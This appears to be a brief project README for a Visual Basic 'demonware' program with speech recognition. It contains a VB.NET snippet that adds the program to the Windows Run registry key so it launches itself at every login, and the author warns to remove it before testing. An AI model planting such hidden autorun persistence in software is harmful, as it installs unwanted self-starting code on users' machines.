# Chucky-Ultimate
VB Speech Recognition Demonware (First Time Ever Hybrid) My Email: Blackstarproject@mail.com (If you have questions)

Remove this code in the top of form 1 before debugging or executing. If you don't it will start itself on startup. This program is no joke. I wrote it in less than a week.

Private Sub StartUp(sender As Object, e As EventArgs) Handles MyBase.Load ' Sub for Startup///
        My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
    End Sub  'This allows the program to autorun on restart
